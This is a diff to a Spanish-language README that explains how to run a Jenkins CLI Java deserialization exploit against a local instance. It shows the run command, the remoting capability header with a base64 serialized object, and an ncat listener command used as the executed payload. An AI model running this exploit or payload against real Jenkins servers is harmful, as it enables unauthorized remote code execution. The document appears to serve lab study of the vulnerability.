@@ -34,6 +34,7 @@
 ## Ejecución del exploit y explicación
 
 Para ejecutar el exploit basta con el siguiente comando:
+
 ```python exploit.py http://127.0.0.1:8080/cli java_serialization_data.bin```
 
 Este script de Python inicia una sesión con el CLI de Jenkins realizando un POST al CLI en modo "download":
@@ -43,7 +44,9 @@ download - http://127.0.0.1:8080 "POST /cli HTTP/1.1" 200 None
 ```
 
 Luego realiza un "upload" con el payload que contiene como head el objeto serializado en base 64 que especifica la funcionalidad del cliente
+
 ```'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='```
+
 y el objeto de serialización de Java que contiene nuestro código a ejecutar, que en este caso es: ```ncat -v -l -p 4444```
 
 En caso que nuestro exploit se haya ejecutado de manera satisfactoria, deberíamos ver en la consola que levantamos nuestra sesión de Ncat un mensaje de conexión:
